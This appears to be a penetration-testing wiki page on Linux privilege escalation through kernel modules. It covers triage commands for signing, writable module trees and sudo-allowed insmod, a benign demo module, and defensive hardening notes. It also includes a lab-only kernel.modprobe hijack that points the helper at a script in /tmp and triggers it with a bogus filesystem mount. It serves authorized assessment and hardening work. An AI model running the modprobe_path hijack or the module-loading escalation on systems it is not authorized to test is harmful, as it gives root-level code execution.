# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Kernel module and module-loading misconfigurations

Kernel module support is a high-impact area during Linux privilege escalation review. Do not treat every unsigned-module message as exploitable by itself, but use it to answer practical questions.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Can the current user load modules through `sudo`, capabilities, or a writable helper path?
- Is module loading still enabled?
- Is module signature enforcement disabled?
- Are module directories or module files writable?
- Can kernel logs be read to confirm what happened?

Quick triage starts with the following module-status, signature, logging, and module-tree checks.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretation:

- `modules_disabled=1` means modules can be neither loaded nor unloaded, and the value cannot be reset to `0` until reboot.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` on the kernel command line or `CONFIG_MODULE_SIG_FORCE=y` requires validly signed modules; otherwise, unsigned modules may load and taint the kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` imposes no restriction on `dmesg`; when it is `1`, access requires `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Writable paths under `/lib/modules/$(uname -r)/` are dangerous because `modprobe` searches that tree and its dependency data when loading modules.<sup>[[8]](#references)</sup>

### Loading a module and reading kernel output

If you have legitimate permission to load a local module, `insmod` inserts the exact `.ko` file you provide. The module's init function runs as part of the load, and messages written with `printk()` go to the kernel log buffer, which is normally read with `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

A minimal review workflow uses `modinfo` to inspect metadata, `insmod` and `rmmod` to load and remove a module, `lsmod` to confirm loaded state, and `dmesg` to inspect kernel logs.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

If `sudo -l` allows `insmod`, `modprobe`, or a wrapper around them, treat it as critical: `sudo -l` lists the invoking user's privileges, and loading a kernel module requires `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo-allowed `insmod`

A sudo rule that allows a user to run `insmod` is not comparable to allowing a normal administrative helper. The module's initialization code runs as part of insertion, so the practical review question is whether this user can choose or modify the module being loaded.<sup>[[3]](#references)</sup>

The following generic review flow repeats those inspection, load, state, log, and removal checks for a candidate module.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

If the user can provide an arbitrary `.ko`, the rule should be treated as full system compromise in an authorized assessment. A safer operational pattern is to avoid delegating module loading through sudo; if it is unavoidable, restrict the exact path, ownership, permissions, signing policy, and removal workflow.<sup>[[3]](#references)[[10]](#references)</sup>

For a harmless module-building pattern in a controlled lab, a minimal source and Makefile are shown below; the `make -C /lib/modules/$(uname -r)/build M=$PWD` form follows the kernel's documented kbuild workflow for external modules.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Build and load only in an authorized lab; kbuild builds the external module and the load/remove commands invoke the kernel module interfaces.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` names the userspace helper the kernel executes for module autoload requests; this sysctl affects autoloading, not explicit module insertion. If an attacker can change it to a writable executable path and trigger a module request, that helper becomes a privileged code-execution path.<sup>[[1]](#references)</sup>

Check the current helper path through the kernel sysctl interface and inspect the target's ownership and mode.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Check whether the sysctl, delegated sudo rules, or file capabilities can be influenced.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

The following lab-only pattern changes the helper path and triggers a documented module-autoload request; use it only on an isolated, authorized system.<sup>[[1]](#references)</sup>

On current Linux kernels, do not use an unknown executable as a generic trigger: legacy custom binary-format module autoloading was removed in Linux 6.14, while the kernel documentation identifies an unknown filesystem type as a module-autoload request path.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

On hardened systems, this should fail when permissions prevent unprivileged writes to `kernel.modprobe`, the helper path is not writable, or module autoloading is disabled.<sup>[[1]](#references)</sup>

### Writable `/lib/modules` review

Writable module directories can allow module replacement, malicious module planting, or auto-load abuse depending on how `modprobe` is later invoked; `modprobe` searches `/lib/modules/$(uname -r)` and uses its dependency data when resolving modules.<sup>[[8]](#references)</sup>

Review writable module files and dependency/alias metadata under the active kernel release's module tree.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

If you find writable module content, inspect how `modprobe` resolves dependencies and how `modinfo` reports module metadata.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Defensive notes:

- Keep `/lib/modules` owned by `root:root` and non-writable by users.<sup>[[8]](#references)</sup>
- Set `kernel.modules_disabled=1` after boot where operationally possible.<sup>[[1]](#references)</sup>
- Enforce module signing on systems that require loadable modules.<sup>[[2]](#references)</sup>
- Monitor writes to `/proc/sys/kernel/modprobe`, `/lib/modules`, and unexpected `insmod`/`modprobe` execution.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [Documentation for /proc/sys/kernel/ — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux manual page](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — The Linux Kernel documentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Message logging with printk — The Linux Kernel documentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — The Linux Kernel documentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)

{{#include ../../banners/hacktricks-training.md}}
